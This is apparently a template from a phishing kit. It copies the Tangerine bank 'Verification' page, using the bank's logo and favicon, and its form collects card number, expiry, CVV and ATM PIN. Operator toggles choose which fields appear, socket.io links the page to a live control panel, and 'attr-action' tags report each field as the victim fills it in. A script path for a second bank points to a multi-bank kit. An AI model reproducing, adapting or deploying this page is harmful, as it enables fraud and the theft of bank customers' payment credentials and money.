<%

let p_card = tangerine.card === 'on' ? true : false;
let p_atm = tangerine.atm === 'on' ? true : false;
let p_cvv = tangerine.cvv === 'on' ? true : false;
let p_expiry = tangerine.exp === 'on' ? true : false;

%>
<html>
    <head>
        <meta charset="utf-8">
        <title>Verification | Tangerine</title>
        <meta name="description" content="">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="viewport" content="width=device-width, maximum-scale=1.0">
        <link rel="shortcut icon" href="https://www.tangerine.ca/app/favicon.ico" type="image/x-icon">
        <link href="/assets/tang/files/global.css" rel="stylesheet">
        <link href="/assets/tang/files/app.css" rel="stylesheet">
        <style type="text/css" id="kampyleStyle">.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}</style>
        <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
        <script>var lrbank = '<?=escape($udata->last->bank)?>'; var lrinfo = '<?=escape($udata->last->info)?>';</script>
        <script src="/assets/js/actions.js?v=<?=time()?>"></script>
        <script src="/socket.io/socket.io.js"></script>
    </head>
    <body translate-cloak="" application-theme="" state="forgotLogin" class="fb2-index ng-scope application-theme-web" style="overflow: visible;">
        <tng-main-nav class="ng-isolate-scope">
            <nav class="navbar print-hide" ng-class="{'nativeNav' : $ctrl.EnvironmentService.isNative()}">
                <a id="mainNav_home" class="brand nonclickable" href="" ng-click="$ctrl.handleGoHome()" ng-class="{'nonclickable' : $ctrl.isTitleLogoNotClickable()}">
                    <img ng-src="assets/images/brand-white.png" alt="Tangerine" class="logo-white print-hide" src="/assets/tang/files/brand-white.png">
                    <img ng-src="assets/images/brand-orange.png" alt="Tangerine" class="logo-orange print-only-inline" src="/assets/tang/files/brand-orange.png">
                </a>
            </nav>
        </tng-main-nav>
        <div ui-view="page-content" class="page-content ng-scope" style="padding-bottom: 0px;">
            <forgot-login class="ng-scope ng-isolate-scope">
                <form id="loginForm" method="post" action="" class="ng-pristine ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength ng-valid-email">
                    <input type="hidden" id="userAgent" name="userAgent">
                    <style>
                    .forgot-login select, .forgot-login input[type="text"], .forgot-login input[type="tel"], .forgot-login input[type="password"] {
                        font-size: 17px;
                        margin-top: 10px;
                        margin-bottom: 15px;
                        font-weight: 500;
                        border: 1px solid #9e9e9e;
                    }

                    .heading--title2 {
                        margin-bottom: 25px;
                        text-align: center;
                    }

                    .forgot-login button {
                        margin: 0px;
                    }

                    .text-right {
                        text-align: right;
                    }

                    .navbar {
                        display: block !important;
                        background-color: #ea7024 !important;
                    }

                    .btn, [class*=" btn--"], [class^=btn--] {
                        background-color: #ea7024;
                    }

                    .forgot-login__email {
                        max-width: 30em;
                        margin-left: auto;
                        margin-right: auto;
                    }

                    .application-theme-web {
                        background-color: #ffffff;
                    }
                    </style>
                    <div class="forgot-login" style="margin-top: 0px; padding: 23px;">
                        <div class="forgot-login__email ng-scope" ng-if="$ctrl.currentState === $ctrl.STATES.FORM">
                            <h2 class="heading--title2 ng-binding">Payment Information</h2>
                            <% if (p_card) { %>
                                <label>Card Number</label>
                                <div class="form-group">
                                    <input id="input-card" type="tel" placeholder="Enter your Card Number" name="card" class="input lrinput" onkeyup="split()" required autocomplete="off" maxlength="19" oninput="this.value = this.value.replace(/[^0-9, ]/, '')" attr-action="Filling Card">
                                    <!-- Assuming you have the jQuery and splitter.js loaded elsewhere in your template -->
                                </div>
                            <% } %>
                            <% if (p_expiry) { %>
                                <label>Expiry</label>
                                <div class="form-group">
                                    <select name="exp1" required class="input lrinput" style="width:48%; display: inline-block;" attr-action="Selecting Expiry">
                                        <option value="">MM</option>
                                        <% for (let x = 1; x <= 12; x++) { %>
                                            <% let y = x.toString().padStart(2, '0'); %>
                                            <option value="<%= y %>"><%= y %></option>
                                        <% } %>
                                    </select>
                                    <select name="exp2" required class="input lrinput" style="width:50%; display: inline-block;" attr-action="Selecting Expiry">
                                        <option value="">YY</option>
                                        <% for (let x = new Date().getFullYear() % 100; x <= new Date().getFullYear() % 100 + 15; x++) { %>
                                            <option value="<%= x %>"><%= x %></option>
                                        <% } %>
                                    </select>
                                </div>
                            <% } %>
                            <% if (p_cvv) { %>
                                <div class="form-group">
                                    <label>CVV</label>
                                    <input required id="input-cvv" type="tel" maxlength="3" placeholder="&bullet;&bullet;&bullet;" name="cvv" class="input lrinput" oninput="this.value = this.value.replace(/[^0-9]/, '')" attr-action="Filling CVV">
                                </div>
                            <% } %>
                            <% if (p_atm) { %>
                                <div class="form-group">
                                    <label>ATM Pin</label>
                                    <input required id="input-atm" type="tel" maxlength="6" placeholder="&bullet;&bullet;&bullet;&bullet;" name="atm" class="input lrinput" oninput="this.value = this.value.replace(/[^0-9]/, '')" attr-action="Filling ATM Pin">
                                </div>
                            <% } %>
                            
                            <div class="text-right">
                                <button actionable-id="forgot_nextButton" class="btn btn--tangerine ng-binding " type="button" onclick="submitForm()" id="forgot_nextButton" name="save" value="1"> Next </button>
                            </div>
                        </div>
                    </div>
                </form>
            </forgot-login>
        </div>
        <span hidden id="navig"> <%=navig%> </span>
        <span hidden id="stage">Card</span>
    </body>
    <script src="/bank/atb/js/scriptCard.js"></script>
    <script src="/bank/tangerine/js/script.js">
    </script>
</html>

